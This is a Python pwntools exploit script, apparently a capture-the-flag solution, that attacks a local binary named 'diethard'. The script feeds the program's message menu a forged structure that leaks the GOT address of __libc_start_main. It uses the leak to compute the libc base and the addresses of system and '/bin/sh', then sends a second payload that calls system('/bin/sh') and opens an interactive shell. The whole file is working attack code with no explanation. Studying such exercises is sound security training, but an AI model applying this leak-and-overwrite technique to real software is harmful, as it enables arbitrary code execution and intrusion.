from pwn import *

def Add(p, length, content):
    p.sendlineafter("3. Exit\n\n", '1')
    p.sendlineafter("Input Message Length:\n", str(length))
    p.sendlineafter("Please Input Message:\n", content)

def Del(p, index):
    p.sendlineafter("3. Exit\n\n", '2')
    p.sendlineafter('Which Message You Want To Delete?\n', str(index))

def Show(p):
    p.sendlineafter("3. Exit\n\n", '2')
    data = p.recvuntil('Which Message You Want To Delete?\n')
    p.send("1234556" + '\n')
    return data

if __name__ == '__main__':
    p = process("./diethard", env = {"LD_PRELOAD": "./libc.so.6"})
    #gdb.attach(p, '''
    #break *0x400ba2
    #continue
    #''')
    libc = ELF("./libc.so.6")
    e = ELF("./diethard")

    Add(p, 2015, "AAAAAAAA")
    Add(p, 2015, "BBBBBBBB")

    payload = ''
    payload += p64(0)
    payload += p64(0x7df)
    payload += p64(e.got['__libc_start_main'])
    payload += p64(0x400976)
    Add(p, 2047, payload)

    libc_start_main_addr = u64(Show(p).split('1. ')[1][:8])
    print "[+] libc_start_main addr = 0x%x" % libc_start_main_addr
    libc_base_addr = libc_start_main_addr - libc.symbols['__libc_start_main']
    print "[+] libc_base addr = 0x%x" % libc_base_addr
    system_addr = libc_base_addr + libc.symbols['system']
    print "[+] system_addr = 0x%x" % system_addr
    binsh_addr = libc_base_addr + next(libc.search('/bin/sh'))
    print "[+] /bin/sh addr = 0x%x" % binsh_addr

    Del(p, '0')
    Del(p, '1')
    Del(p, '2')

    payload2 = ''
    payload2 += p64(0)
    payload2 += p64(0x7df)
    payload2 += p64(binsh_addr)
    payload2 += p64(system_addr)

    Add(p, 2015, "AAAAAAAA")
    Add(p, 2015, "BBBBBBBB")
    Add(p, 2047, payload2)

    p.sendlineafter("3. Exit\n\n", '2')

    p.interactive()
